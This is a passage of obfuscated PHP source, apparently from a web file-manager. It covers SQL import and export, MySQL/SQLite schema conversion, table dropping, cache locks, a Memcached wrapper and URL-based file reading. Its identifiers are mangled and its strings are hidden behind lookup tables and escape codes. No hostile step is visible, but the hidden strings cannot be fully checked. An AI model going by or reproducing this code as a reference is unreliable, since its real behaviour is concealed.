(!$‚ÀÀ÷¶) { $‚ÀÀ÷¶ = $ìöœÎüè . $ò©µïç[53]; } continue; } if ($êÖ·í‘Ô) { $êÖ·í‘Ô->task[$ò©µïç[792]] += 1; } $»øöÖ›é++; $˜¢ş±˜[] = rtrim(rtrim(trim($ìöœÎüè), $ò©µïç[50]), $ò©µïç[71]); $½ÖËÈ»´ = null; $œúÃ©Ø = strlen($ìöœÎüè); $„»Œ•şò += $œúÃ©Ø; if ($„»Œ•şò >= ($ö´¬Òºª == 500 ? $Ç­á™¤ : $×ºÎ»¹ß)) { $½ÖËÈ»´ = array_pop($˜¢ş±˜); if ($»øöÖ›é > 1) { $»øöÖ›é--; } } if ($»øöÖ›é >= $ö´¬Òºª || $½ÖËÈ»´) { $ìöœÎüè = $‚ÀÀ÷¶ . implode($ò©µïç[50], $˜¢ş±˜); if (!$†Û•ÕË->execute($ìöœÎüè)) { return !1; } if ($êÖ·í‘Ô) { $êÖ·í‘Ô->update($»øöÖ›é); } $˜¢ş±˜ = array(); $»øöÖ›é = 0; $„»Œ•şò = 0; if ($½ÖËÈ»´) { $˜¢ş±˜ = array($½ÖËÈ»´); $»øöÖ›é = 1; $„»Œ•şò = $œúÃ©Ø; } } } fclose($ÎÁ×—ËÁ); if (!empty($˜¢ş±˜)) { $ìöœÎüè = $‚ÀÀ÷¶ . implode($ò©µïç[50], $˜¢ş±˜); if (!$†Û•ÕË->execute($ìöœÎüè)) { return !1; } if ($êÖ·í‘Ô) { $êÖ·í‘Ô->update($»øöÖ›é); } } return !0; } public function dropTable($×Íñ°à = null) { $¼‡èÅÇâ = $this->model()->db(); $˜ê„äå¬ = $×Íñ°à ? array($×Íñ°à) : $¼‡èÅÇâ->getTables(); if (!$˜ê„äå¬) { return; } foreach ($˜ê„äå¬ as $×Íñ°à) { if ($×Íñ°à) { $×Íñ°à = strtolower($×Íñ°à); } else { continue; } $¼‡èÅÇâ->execute("\x64\x72\157\160\40\x74\141\x62\x6c\145\40\151\x66\x20\x65\170\151\163\x74\x73\40\x60{$×Íñ°à}\x60"); } } private function sqlEncode($¯Åˆ Ôê) { $ŠÕåãåŒ =& $_SERVER[Ã¶¡¶„æ]; $±ÜÌÎËË = array(); foreach ($¯Åˆ Ôê as $Óé¼Üò) { if (is_array($Óé¼Üò)) { $Óé¼Üò = json_encode_force($Óé¼Üò); } $Óé¼Üò = addslashes($Óé¼Üò); $Óé¼Üò = str_replace(array($ŠÕåãåŒ[1092], $ŠÕåãåŒ[231]), array($ŠÕåãåŒ[1093], $ŠÕåãåŒ[1094]), $Óé¼Üò); $±ÜÌÎËË[] = str_replace($ŠÕåãåŒ[58], $ŠÕåãåŒ[1095], $Óé¼Üò); } return $ŠÕåãåŒ[58] . implode($ŠÕåãåŒ[1096], $±ÜÌÎËË) . $ŠÕåãåŒ[58]; } private function sqlDecode($±¹ğ², $Ú®¾¼Ü«, $”‰¡Âß“ = '') { $İî’Ü¼° =& $_SERVER[Ã¶¡¶„æ]; $±¹ğ² = str_replace(array($İî’Ü¼°[1093], $İî’Ü¼°[1094]), array($İî’Ü¼°[1092], $İî’Ü¼°[231]), $±¹ğ²); if ($Ú®¾¼Ü« == $İî’Ü¼°[13]) { return $”‰¡Âß“ != $İî’Ü¼°[1097] ? stripslashes($±¹ğ²) : $±¹ğ²; } if ($”‰¡Âß“ == $İî’Ü¼°[1097]) { $±¹ğ² = str_replace($İî’Ü¼°[1098], $İî’Ü¼°[118], stripslashes($±¹ğ²)); } return $±¹ğ²; } public function getSqlFile($Õ¡‰Äœ§ = '') { $Ş¡ÄÅÌñ =& $_SERVER[Ã¶¡¶„æ]; $ÄÉ¯¼‹‹ = $this->dbType(!0); $¸¯Ö²êº = CONTROLLER_DIR . "\151\156\x73\164\x61\154\154\x2f\x64\141\x74\141\x2f{$ÄÉ¯¼‹‹}\56\x73\x71\154"; $Õ¾ ø€ƒ = file_get_contents($¸¯Ö²êº); $Éš‰Åá‘ = $Ş¡ÄÅÌñ[1099] . ($ÄÉ¯¼‹‹ == $Ş¡ÄÅÌñ[810] ? $Ş¡ÄÅÌñ[1100] : $Ş¡ÄÅÌñ[1101]) . $Ş¡ÄÅÌñ[1102]; preg_match_all($Éš‰Åá‘, $Õ¾ ø€ƒ, $ô„œˆÑÒ); $»çŸÔ’ï = $ô„œˆÑÒ[1]; $äôÑ„Ì = $this->model()->db(); $ƒáš£Ôï = $äôÑ„Ì->getTables(); $ç¨ËŠÆ‹ = TEMP_FILES . $Ş¡ÄÅÌñ[1103] . date($Ş¡ÄÅÌñ[757]) . $Ş¡ÄÅÌñ[8]; del_dir($ç¨ËŠÆ‹); mk_dir($ç¨ËŠÆ‹); $»›Ş¡Ú¤ = $ç¨ËŠÆ‹ . $Ş¡ÄÅÌñ[1104]; $Ó†ûÄ‘ = $ç¨ËŠÆ‹ . $Ş¡ÄÅÌñ[1105]; $ƒ¥ášéª = $ÄÉ¯¼‹‹ == $Ş¡ÄÅÌñ[13] ? $Ş¡ÄÅÌñ[810] : $Ş¡ÄÅÌñ[13]; IO::copy(CONTROLLER_DIR . "\x69\156\163\164\x61\154\x6c\x2f\144\141\x74\141\57{$ƒ¥ášéª}\56\163\161\154", $ç¨ËŠÆ‹); @touch($ç¨ËŠÆ‹ . $ÄÉ¯¼‹‹ . $Ş¡ÄÅÌñ[794]); $®ÀºüŒ = fopen($»›Ş¡Ú¤, $Ş¡ÄÅÌñ[1080]); $¡¾¯éê§ = fopen($Ó†ûÄ‘, $Ş¡ÄÅÌñ[1080]); if ($ÄÉ¯¼‹‹ == $Ş¡ÄÅÌñ[13]) { $ƒáš£Ôï = array_diff($ƒáš£Ôï, array($Ş¡ÄÅÌñ[790], $Ş¡ÄÅÌñ[791])); $’ûÚÌ¦× = array($Ş¡ÄÅÌñ[1106], $Ş¡ÄÅÌñ[1107], $Ş¡ÄÅÌñ[1108]); fwrite($¡¾¯éê§, implode(PHP_EOL, $’ûÚÌ¦×) . PHP_EOL . PHP_EOL); foreach ($ƒáš£Ôï as $áò§àÌì) { $Ş”Ó¡¨… = $this->sqlFromSqlite($áò§àÌì); if (!$Ş”Ó¡¨…[$Ş¡ÄÅÌñ[13]]) { continue; } fwrite($¡¾¯éê§, $Ş”Ó¡¨…[$Ş¡ÄÅÌñ[13]] . PHP_EOL . PHP_EOL); if (!in_array($áò§àÌì, $»çŸÔ’ï)) { fwrite($®ÀºüŒ, $Ş”Ó¡¨…[$Ş¡ÄÅÌñ[810]] . PHP_EOL . PHP_EOL); } } } else { foreach ($ƒáš£Ôï as $áò§àÌì) { $Ş”Ó¡¨… = $this->sqlFromMysql($áò§àÌì); if (!$Ş”Ó¡¨…[$Ş¡ÄÅÌñ[810]]) { continue; } fwrite($®ÀºüŒ, $Ş”Ó¡¨…[$Ş¡ÄÅÌñ[810]] . PHP_EOL . PHP_EOL); if (!in_array($áò§àÌì, $»çŸÔ’ï)) { fwrite($¡¾¯éê§, $Ş”Ó¡¨…[$Ş¡ÄÅÌñ[13]] . PHP_EOL . PHP_EOL); } } } fclose($®ÀºüŒ); fclose($¡¾¯éê§); $Õ¾ ø€ƒ = array($Ş¡ÄÅÌñ[810] => $»›Ş¡Ú¤, $Ş¡ÄÅÌñ[13] => $Ó†ûÄ‘); return $Õ¡‰Äœ§ ? $Õ¾ ø€ƒ[$Õ¡‰Äœ§] : $Õ¾ ø€ƒ; } public function dbType($ŒòÇ›²ş = false) { $¨²´­ë =& $_SERVER[Ã¶¡¶„æ]; $Œğ´Õ¦û = $ŒòÇ›²ş ? $GLOBALS[$¨²´­ë[6]][$¨²´­ë[21]] : $this->database; $Œğ´Õ¦û = array_change_key_case($Œğ´Õ¦û); $ÍëéÃÆ = $Œğ´Õ¦û[$¨²´­ë[981]]; if ($ÍëéÃÆ == $¨²´­ë[978]) { $ü¯Ø’‹Ø = explode($¨²´­ë[4], $Œğ´Õ¦û[$¨²´­ë[987]]); $ÍëéÃÆ = $ü¯Ø’‹Ø[0]; } $ßí…šÅæ = array($¨²´­ë[1109] => $¨²´­ë[13], $¨²´­ë[926] => $¨²´­ë[810]); if (isset($ßí…šÅæ[$ÍëéÃÆ])) { $ÍëéÃÆ = $ßí…šÅæ[$ÍëéÃÆ]; } return $ÍëéÃÆ; } public function sqlFromMysql($§ŠÊ†±§, $šÂô‹“Ë = '') { $ß—áƒüÂ =& $_SERVER[Ã¶¡¶„æ]; $–ÇÆößÃ = $this->model()->db(); $†Ùïìäá = $–ÇÆößÃ->query($ß—áƒüÂ[1110] . $§ŠÊ†±§ . $ß—áƒüÂ[385]); if (!$†Ùïìäá || !$†Ùïìäá[0]) { return !1; } $´µò¯³ = _get($†Ùïìäá[0], $ß—áƒüÂ[1111], $ß—áƒüÂ[12]); if (!$´µò¯³) { return !1; } $¦ëçœ€— = "\104\x52\x4f\120\40\124\101\x42\114\105\40\x49\x46\x20\105\130\111\123\x54\x53\40\x60{$§ŠÊ†±§}\140\x3b" . PHP_EOL . $´µò¯³ . $ß—áƒüÂ[71]; if ($šÂô‹“Ë && $šÂô‹“Ë == $ß—áƒüÂ[810]) { return $¦ëçœ€—; } $„ÔÍ‰× = array_change_key_case($GLOBALS[$ß—áƒüÂ[6]][$ß—áƒüÂ[21]]); $á´¡ª¥Ü = $„ÔÍ‰×[$ß—áƒüÂ[986]]; $Ş›áûõ = $ß—áƒüÂ[1112] . $á´¡ª¥Ü . $ß—áƒüÂ[1113] . $§ŠÊ†±§ . $ß—áƒüÂ[58]; $Ÿ•—ƒ¸ = $ß—áƒüÂ[1114] . $§ŠÊ†±§ . $ß—áƒüÂ[914]; $˜‰–ˆê­ = $–ÇÆößÃ->query($Ş›áûõ); if (empty($˜‰–ˆê­)) { $±ü¾ÓÛÃ = array($ß—áƒüÂ[810] => $ß—áƒüÂ[12], $ß—áƒüÂ[13] => $ß—áƒüÂ[12]); return $šÂô‹“Ë ? $±ü¾ÓÛÃ[$šÂô‹“Ë] : $±ü¾ÓÛÃ; } $š£¥ë½‚ = $–ÇÆößÃ->query($Ÿ•—ƒ¸); $„¸æïì• = $ß—áƒüÂ[12]; $ÍØ–®‹× = array(); foreach ($š£¥ë½‚ as $¡“Ã×ÌÔ) { if (!$„¸æïì• && $¡“Ã×ÌÔ[$ß—áƒüÂ[1115]] == $ß—áƒüÂ[1116]) { $„¸æïì• = $¡“Ã×ÌÔ[$ß—áƒüÂ[1117]]; } if (isset($ÍØ–®‹×[$¡“Ã×ÌÔ[$ß—áƒüÂ[1115]]])) { $ÍØ–®‹×[$¡“Ã×ÌÔ[$ß—áƒüÂ[1115]]][$ß—áƒüÂ[1118]][] = $¡“Ã×ÌÔ[$ß—áƒüÂ[1117]]; continue; } $ÍØ–®‹×[$¡“Ã×ÌÔ[$ß—áƒüÂ[1115]]] = array($ß—áƒüÂ[1119] => $¡“Ã×ÌÔ[$ß—áƒüÂ[1115]], $ß—áƒüÂ[1118] => array($¡“Ã×ÌÔ[$ß—áƒüÂ[1117]]), $ß—áƒüÂ[1120] => $¡“Ã×ÌÔ[$ß—áƒüÂ[1121]] == $ß—áƒüÂ[88] ? 0 : 1); } $À¡ÈğÓ = array(); foreach ($ÍØ–®‹× as $¡“Ã×ÌÔ) { $ùÃË¹Šü = $¡“Ã×ÌÔ[$ß—áƒüÂ[1119]] == $ß—áƒüÂ[1116]; $Èğ¡Â±… = array($ß—áƒüÂ[1122], $¡“Ã×ÌÔ[$ß—áƒüÂ[1120]] == $ß—áƒüÂ[88] && !$ùÃË¹Šü ? $ß—áƒüÂ[1123] : $ß—áƒüÂ[12], $ß—áƒüÂ[1124], $ß—áƒüÂ[1125] . $§ŠÊ†±§ . $ß—áƒüÂ[11] . ($ùÃË¹Šü ? $ß—áƒüÂ[1126] : $¡“Ã×ÌÔ[$ß—áƒüÂ[1119]]) . $ß—áƒüÂ[118], $ß—áƒüÂ[1127], $ß—áƒüÂ[118] . $§ŠÊ†±§ . $ß—áƒüÂ[118], $ß—áƒüÂ[1128] . implode($ß—áƒüÂ[1129], $¡“Ã×ÌÔ[$ß—áƒüÂ[1118]]) . $ß—áƒüÂ[1130]); $À¡ÈğÓ[] = implode($ß—áƒüÂ[53], $Èğ¡Â±…) . $ß—áƒüÂ[71]; } $ÏĞÙ—¦ã = array(); $¥¬ºÆµ¢ = array($ß—áƒüÂ[1131] => $ß—áƒüÂ[1132], $ß—áƒüÂ[1132] => $ß—áƒüÂ[1132], $ß—áƒüÂ[288] => $ß—áƒüÂ[315], $ß—áƒüÂ[287] => $ß—áƒüÂ[315]); foreach ($˜‰–ˆê­ as $¡“Ã×ÌÔ) { $Èğ¡Â±… = array($ß—áƒüÂ[118] . $¡“Ã×ÌÔ[$ß—áƒüÂ[1133]] . $ß—áƒüÂ[118], isset($¥¬ºÆµ¢[$¡“Ã×ÌÔ[$ß—áƒüÂ[1134]]]) ? $¥¬ºÆµ¢[$¡“Ã×ÌÔ[$ß—áƒüÂ[1134]]] : $¡“Ã×ÌÔ[$ß—áƒüÂ[1135]], $¡“Ã×ÌÔ[$ß—áƒüÂ[1136]] == $ß—áƒüÂ[912] ? $ß—áƒüÂ[1137] : $ß—áƒüÂ[1138], $¡“Ã×ÌÔ[$ß—áƒüÂ[1133]] == $„¸æïì• ? $ß—áƒüÂ[1139] : $ß—áƒüÂ[12], $¡“Ã×ÌÔ[$ß—áƒüÂ[963]] ? strtoupper(str_replace($ß—áƒüÂ[11], $ß—áƒüÂ[12], $¡“Ã×ÌÔ[$ß—áƒüÂ[963]])) : $ß—áƒüÂ[12]); $ÏĞÙ—¦ã[] = trim(implode($ß—áƒüÂ[53], $Èğ¡Â±…)); } $úìé¼¼ñ = array($ß—áƒüÂ[1140] . $§ŠÊ†±§ . $ß—áƒüÂ[1141], $ß—áƒüÂ[1142] . $§ŠÊ†±§ . $ß—áƒüÂ[1143], implode($ß—áƒüÂ[50] . PHP_EOL, $ÏĞÙ—¦ã), $ß—áƒüÂ[960]); $‹÷“ãœ = implode(PHP_EOL, array_merge($úìé¼¼ñ, $À¡ÈğÓ)); if ($šÂô‹“Ë && $šÂô‹“Ë == $ß—áƒüÂ[13]) { return $‹÷“ãœ; } $±ü¾ÓÛÃ = array($ß—áƒüÂ[810] => $¦ëçœ€—, $ß—áƒüÂ[13] => $‹÷“ãœ); return $šÂô‹“Ë ? $±ü¾ÓÛÃ[$šÂô‹“Ë] : $±ü¾ÓÛÃ; } public function sqlFromSqlite($º¥èçş, $ÑÏÅ¸µÉ = '') { $™¦ê¹ìè =& $_SERVER[Ã¶¡¶„æ]; $°ğÆÀß = $this->model()->db(); $¿Ó¸½“¹ = "\120\122\x41\107\115\x41\40\124\x41\x42\114\x45\137\111\x4e\106\117\x20\x28\47{$º¥èçş}\47\x29"; $£Š›‚ÅÂ = "\x53\x45\x4c\x45\x43\x54\40\52\40\x46\x52\117\x4d\x20\163\x71\x6c\151\x74\145\x5f\155\141\x73\x74\x65\162\x20\x57\110\x45\122\105\x20\x74\142\x6c\137\x6e\x61\x6d\145\x20\x3d\40\x27{$º¥èçş}\47"; $õºÛØ¨ = $°ğÆÀß->query($¿Ó¸½“¹); if (empty($õºÛØ¨)) { $ë´­“Ì„ = array($™¦ê¹ìè[810] => $™¦ê¹ìè[12], $™¦ê¹ìè[13] => $™¦ê¹ìè[12]); return $ÑÏÅ¸µÉ ? $ë´­“Ì„[$ÑÏÅ¸µÉ] : $ë´­“Ì„; } $ã™ºÈÀİ = $°ğÆÀß->query($£Š›‚ÅÂ); $ŸÎÕ‡›Õ = $ª¶òŠ­“ = array(); foreach ($ã™ºÈÀİ as $ÚÑéĞá“) { if ($ÚÑéĞá“[$™¦ê¹ìè[33]] == $™¦ê¹ìè[279]) { $ŸÎÕ‡›Õ[] = $ÚÑéĞá“[$™¦ê¹ìè[1144]]; } else { $ª¶òŠ­“[$ÚÑéĞá“[$™¦ê¹ìè[32]]] = $ÚÑéĞá“[$™¦ê¹ìè[1144]]; } } $ÒäíĞĞ = array_merge(array($™¦ê¹ìè[1140] . $º¥èçş . $™¦ê¹ìè[118]), $ŸÎÕ‡›Õ, array_values($ª¶òŠ­“)); $ÒäíĞĞ = implode($™¦ê¹ìè[71] . PHP_EOL, $ÒäíĞĞ) . $™¦ê¹ìè[71]; if ($ÑÏÅ¸µÉ && $ÑÏÅ¸µÉ == $™¦ê¹ìè[13]) { return $ÒäíĞĞ; } $“¸Òî…° = array(); $…·ğí²˜ = array($™¦ê¹ìè[1132] => $™¦ê¹ìè[1145], $™¦ê¹ìè[315] => $™¦ê¹ìè[1146]); $°ã«Ôú’ = $™¦ê¹ìè[12]; foreach ($õºÛØ¨ as $ÚÑéĞá“) { if ($ÚÑéĞá“[$™¦ê¹ìè[57]] == $™¦ê¹ìè[88]) { $°ã«Ôú’ = $ÚÑéĞá“[$™¦ê¹ìè[32]]; } $šùÀæÇ§ = array($™¦ê¹ìè[385] . $ÚÑéĞá“[$™¦ê¹ìè[32]] . $™¦ê¹ìè[385], isset($…·ğí²˜[$ÚÑéĞá“[$™¦ê¹ìè[33]]]) ? $…·ğí²˜[$ÚÑéĞá“[$™¦ê¹ìè[33]]] : $ÚÑéĞá“[$™¦ê¹ìè[33]], $ÚÑéĞá“[$™¦ê¹ìè[35]] == $™¦ê¹ìè[88] ? $™¦ê¹ìè[1137] : $™¦ê¹ìè[1147] . $ÚÑéĞá“[$™¦ê¹ìè[56]], $ÚÑéĞá“[$™¦ê¹ìè[57]] == $™¦ê¹ìè[88] ? $™¦ê¹ìè[1148] : $™¦ê¹ìè[12]); $“¸Òî…°[] = trim(implode($™¦ê¹ìè[53], $šùÀæÇ§)); } foreach ($ª¶òŠ­“ as $ğÃ¡¿õà => $…Ë¼ë¯«) { $Î‘Ô›Ü¨ = str_replace($™¦ê¹ìè[1149] . $º¥èçş . $™¦ê¹ìè[11], $™¦ê¹ìè[12], $ğÃ¡¿õà); $¤ä‡Ú«¡ = str_replace(array($™¦ê¹ìè[118], $™¦ê¹ìè[971]), $™¦ê¹ìè[385], substr($…Ë¼ë¯«, stripos($…Ë¼ë¯«, $™¦ê¹ìè[260]))); if ($Î‘Ô›Ü¨ == $™¦ê¹ìè[1126]) { $«¬¦¶ÔÑ = $™¦ê¹ìè[1150] . $°ã«Ôú’ . $™¦ê¹ìè[1151]; } else { $«¬¦¶ÔÑ = (stripos($Î‘Ô›Ü¨, $™¦ê¹ìè[11]) ? $™¦ê¹ìè[1152] : $™¦ê¹ìè[12]) . ($™¦ê¹ìè[1153] . $Î‘Ô›Ü¨ . $™¦ê¹ìè[1154] . $¤ä‡Ú«¡); } $“¸Òî…°[] = $«¬¦¶ÔÑ; } $ä’óÛİ¤ = array($™¦ê¹ìè[1155] . $º¥èçş . $™¦ê¹ìè[1156], $™¦ê¹ìè[1157] . $º¥èçş . $™¦ê¹ìè[1158], implode($™¦ê¹ìè[50] . PHP_EOL, $“¸Òî…°), $™¦ê¹ìè[1159]); $şƒ´’Ÿ = implode(PHP_EOL, $ä’óÛİ¤); if ($ÑÏÅ¸µÉ && $ÑÏÅ¸µÉ == $™¦ê¹ìè[810]) { return $şƒ´’Ÿ; } $ë´­“Ì„ = array($™¦ê¹ìè[810] => $şƒ´’Ÿ, $™¦ê¹ìè[13] => $ÒäíĞĞ); return $ÑÏÅ¸µÉ ? $ë´­“Ì„[$ÑÏÅ¸µÉ] : $ë´­“Ì„; } } goto dã¤ªêò°Ï; b´¥Šñ®á¥: class CacheLockMemcached { public function lock($ŸéæµÃ¶, $¬ó¼€Âæ = 0) { $Œ°ş‡å› = Cache::init(); $Áˆ£­Ö = microtime(!0) + $¬ó¼€Âæ; while (microtime(!0) < $Áˆ£­Ö) { $¢©œÙ = $Œ°ş‡å›->get($ŸéæµÃ¶); if (!$¢©œÙ || $¢©œÙ < microtime(!0)) { $¢ÍĞËûó = $Œ°ş‡å›->handle->add($ŸéæµÃ¶, $Áˆ£­Ö, $¬ó¼€Âæ); if ($¢ÍĞËûó) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($©Ä¾Öó²) { return Cache::init()->get($©Ä¾Öó²); } public function unlock($¤Şºøí”) { return Cache::init()->remove($¤Şºøí”); } } class CacheLockDatabase { public function lock($…ú·¶ê›, $¦ïÀ‡» = 0) { $Ëé¢ƒÜ = Model($_SERVER[Ã¶¡¶„æ][835]); $ëé¾—ûå = microtime(!0) + $¦ïÀ‡»; while (microtime(!0) < $ëé¾—ûå) { $¡‡ÏÚ© = $Ëé¢ƒÜ->get($…ú·¶ê›); if (!$¡‡ÏÚ© || $¡‡ÏÚ© < microtime(!0)) { $Úü¾åÕ = $Ëé¢ƒÜ->set($…ú·¶ê›, $ëé¾—ûå); if ($Úü¾åÕ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Úµ‡æãª) { return Model($_SERVER[Ã¶¡¶„æ][835])->get($Úµ‡æãª); } public function unlock($¡®‰áŒ) { Model($_SERVER[Ã¶¡¶„æ][835])->remove($¡®‰áŒ); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($ñôßúÃï, $ô§ë´¥) { $ÒÑæÓË‘ =& $_SERVER[Ã¶¡¶„æ]; if (!class_exists($ÒÑæÓË‘[880])) { show_json($ÒÑæÓË‘[881], !1); } $this->cacheTime = $ô§ë´¥; $this->handle = new Memcached(); if (is_array($ñôßúÃï[$ÒÑæÓË‘[882]]) && count($ñôßúÃï[$ÒÑæÓË‘[882]]) >= 1) { foreach ($ñôßúÃï[$ÒÑæÓË‘[882]] as $µ·»ŸÜ) { $¶¾—Å³¢ = explode($ÒÑæÓË‘[4], $µ·»ŸÜ); $this->handle->addServer($¶¾—Å³¢[0], $¶¾—Å³¢[1]); } } else { $this->handle->addServer($ñôßúÃï[$ÒÑæÓË‘[181]], $ñôßúÃï[$ÒÑæÓË‘[182]]); } } public function set($²ª£¿âñ, $ÍğÀÃŒŠ, $ôşúßâÈ = false) { $ôşúßâÈ = $ôşúßâÈ ? $ôşúßâÈ : $this->cacheTime; return $this->handle->set($²ª£¿âñ, $ÍğÀÃŒŠ, $ôşúßâÈ); } public function get($ ÍåÉ¿ú) { return $this->handle->get($ ÍåÉ¿ú); } public function remove($Ø„ú£”±) { return $this->handle->delete($Ø„ú£”±); } public function deleteAll() { return $this->handle->flush(); } } goto dëÛŒÚ½ÍŠ; a¹‰âÕ½¥®: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($Ñíò€Ò = false) { } public function exist($ı¦®¨ø÷) { $³Ëš±‰ä = $this->info($ı¦®¨ø÷); return $³Ëš±‰ä[$_SERVER[Ã¶¡¶„æ][201]]; } public function isFile($ËåÙ‘®) { $ã¾Å—å = $this->info($ËåÙ‘®); return $ã¾Å—å[$_SERVER[Ã¶¡¶„æ][201]]; } public function isFolder($ÏŞğˆÕ©) { return !1; } public function size($­Ò©ôà) { $’¹‡Ÿ´® = $this->info($­Ò©ôà); return $’¹‡Ÿ´®[$_SERVER[Ã¶¡¶„æ][76]]; } public function info($ì¸’š) { return $this->infoParse($ì¸’š); } public function infoAuth($–ß­ı •) { return $this->infoParse($–ß­ı •); } public function infoWithChildren($–çŸş×¦) { return $this->infoParse($–çŸş×¦); } public function infoFull($¾ÕÙÃ°¯) { return $this->infoParse($¾ÕÙÃ°¯); } private function infoParse($úÉÑô¦§) { $‹öÙ‘ü¹ =& $_SERVER[Ã¶¡¶„æ]; $œî·åğË = $this->header($úÉÑô¦§); if (!$œî·åğË || !$œî·åğË[$‹öÙ‘ü¹[756]]) { return !1; } $Ë÷±¦Û¥ = _get($œî·åğË, $‹öÙ‘ü¹[337], 0); $çÑù”ÍÔ = array($‹öÙ‘ü¹[32] => $œî·åğË[$‹öÙ‘ü¹[32]], $‹öÙ‘ü¹[84] => $úÉÑô¦§, $‹öÙ‘ü¹[33] => $‹öÙ‘ü¹[199], $‹öÙ‘ü¹[76] => intval($Ë÷±¦Û¥), $‹öÙ‘ü¹[174] => get_path_ext($œî·åğË[$‹öÙ‘ü¹[32]]), $‹öÙ‘ü¹[1401] => $Ë÷±¦Û¥ > 0 && $œî·åğË[$‹öÙ‘ü¹[1523]], $‹öÙ‘ü¹[1402] => !1); return $çÑù”ÍÔ; } private function header($ÑÎäè¯) { $§Æé˜–® =& $_SERVER[Ã¶¡¶„æ]; if (isset(self::$_cacheHeader[$ÑÎäè¯])) { return self::$_cacheHeader[$ÑÎäè¯]; } $ïÛİ²® = isset($GLOBALS[$§Æé˜–®[1524]]) ? $GLOBALS[$§Æé˜–®[1524]] : !1; $GLOBALS[$§Æé˜–®[1524]] = !0; self::$_cacheHeader[$ÑÎäè¯] = url_header($ÑÎäè¯); $GLOBALS[$§Æé˜–®[1524]] = $ïÛİ²®; return self::$_cacheHeader[$ÑÎäè¯]; } public function hashSimple($¿Ñ“†ÁÂ, $‘”½‰¶š = false) { $Æ†’Ë­Ú =& $_SERVER[Ã¶¡¶„æ]; $İ¼áÂƒÁ = $this->info($¿Ñ“†ÁÂ); if (!$İ¼áÂƒÁ || !$İ¼áÂƒÁ[$Æ†’Ë­Ú[201]]) { return !1; } $ÓÜÈ’Í = $İ¼áÂƒÁ[$Æ†’Ë­Ú[76]]; $‘œ£Ç¼± = 200; $ØæöÍ°§ = 50; if ($ÓÜÈ’Í <= $‘œ£Ç¼± * $ØæöÍ°§) { return md5($this->fileSubstr($¿Ñ“†ÁÂ, 0, $ÓÜÈ’Í)) . $ÓÜÈ’Í; } $ôê¬©©¦ = intval($ÓÜÈ’Í / $ØæöÍ°§); $Ö¦ÑØÅö = $Æ†’Ë­Ú[12]; $”¶ÚòÒ‰ = timeFloat(); $Æ€­¶‰ô = 15; for ($¡ş÷ù®À = 0; $¡ş÷ù®À < $ØæöÍ°§; $¡ş÷ù®À++) { if (timeFloat() - $”¶ÚòÒ‰ > $Æ€­¶‰ô) { return !1; } $˜Ü‘ß¢ = $this->fileSubstr($¿Ñ“†ÁÂ, $ôê¬©©¦ * $¡ş÷ù®À, $‘œ£Ç¼±); if (!$˜Ü‘ß¢) { return !1; } $Ö¦ÑØÅö .= $˜Ü‘ß¢; } $Ö¦ÑØÅö .= $this->fileSubstr($¿Ñ“†ÁÂ, $ÓÜÈ’Í - $‘œ£Ç¼±, $‘œ£Ç¼±); return md5($Ö¦ÑØÅö) . $ÓÜÈ’Í; } public function getContent($³Ø‚±•–) { return $this->fileSubstr($³Ø‚±•–); } public function fileSubstr($ôÕ†ƒİ, $’±äº§ = 0, $ ú²ï’º = -1) { $¾ÒĞÏ¹‘ =& $_SERVER[Ã¶¡¶„æ]; $ùŸÒĞ£º = $this->info($ôÕ†ƒİ); if (!$ùŸÒĞ£º || !$ùŸÒĞ£º[$¾ÒĞÏ¹‘[201]] && $ùŸÒĞ£º[$¾ÒĞÏ¹‘[76]] > 1024 * 1024 * 10) { return !1; } if ($ ú²ï’º === -1) { $ ú²ï’º = $ùŸÒĞ£º[$¾ÒĞÏ¹‘[76]]; } if ($ ú²ï’º == 0) { return $¾ÒĞÏ¹‘[12]; } $«¹…ƒœë = array($¾ÒĞÏ¹‘[1525] . $’±äº§ . $¾ÒĞÏ¹‘[788] . ($’±äº§ + $ ú²ï’º - 1)); $Ç×äØ½É = url_request($ôÕ†ƒİ, $¾ÒĞÏ¹‘[230], !1, $«¹…ƒœë, !1, !1, 30); return $Ç×äØ½É[$¾ÒĞÏ¹‘[1217]] ? $Ç×äØ½É[$¾ÒĞÏ¹‘[1217]] : $¾ÒĞÏ¹‘[12]; } public function download($ì®îâÌ‰, $İïå©üÕ) { Downloader::start($ì®îâÌ‰, $İïå©üÕ); return $İïå©üÕ; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($Ñ³ğÔ–Ö, $Ú—Œü°´ = '') { $this->info = $this->info($Ñ³ğÔ–Ö); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[Ã¶¡¶„æ][84]]; $this->pathOpen = $Ñ³ğÔ–Ö; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$Ñ³ğÔ–Ö])) { self::$_chunkBuffer[$Ñ³ğÔ–Ö] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($ÓıˆĞâ) { $‹’¯’·À = $this->fileSubstr($this->pose, $ÓıˆĞâ); $this->pose += strlen($‹’¯’·À); return $‹’¯’·À; } public function stream_tell() { return $this->pose; } public function stream_seek($Èßùë—, $ÜÌ±ôÈ‡) { $“”ğ¯Øô =& $_SERVER[Ã¶¡¶„æ]; if ($ÜÌ±ôÈ‡ == SEEK_SET) { $this->pose = $Èßùë—; } else { if ($ÜÌ±ôÈ‡ == SEEK_CUR) { $this->pose += $Èßùë—; } else { if ($ÜÌ±ôÈ‡ == SEEK_END) { $this->pose = $this->info[$“”ğ¯Øô[76]] + intval($Èßùë—); } } } if ($Èßùë— < 0) { $this->pose = $this->info[$“”ğ¯Øô[76]] + $Èßùë—; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[Ã¶¡¶„æ][76]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($‡ö®ÃÙ•, $¡ğ—èàŒ) { $ñĞÏÇ‡– =& $_SERVER[Ã¶¡¶„æ]; $ºÔ÷èŞñ = $this->info($‡ö®ÃÙ•); return array($ñĞÏÇ‡–[1526] => 0, $ñĞÏÇ‡–[1527] => 0, $ñĞÏÇ‡–[16] => 32768 + 511, $ñĞÏÇ‡–[1528] => 0, $ñĞÏÇ‡–[1529] => 0, $ñĞÏÇ‡–[1530] => 0, 